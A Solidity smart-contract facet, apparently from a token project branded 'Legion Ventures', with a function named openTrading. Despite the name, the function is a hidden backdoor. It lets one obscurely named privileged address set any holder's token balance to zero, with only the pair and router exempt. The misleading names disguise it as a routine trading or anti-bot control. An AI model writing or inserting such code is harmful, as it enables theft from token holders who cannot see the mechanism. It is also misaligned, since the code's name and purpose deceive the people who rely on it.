/*
 * SPDX-License-Identifier: MIT
 * Telegram: https://t.me/LegionVentures
 * Twitter: https://twitter.com/Legion_Ventures
 * Discord: https://discord.com/invite/legion-ventures
 * Website: https://legion.ventures/
 */
pragma solidity ^0.8.22;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
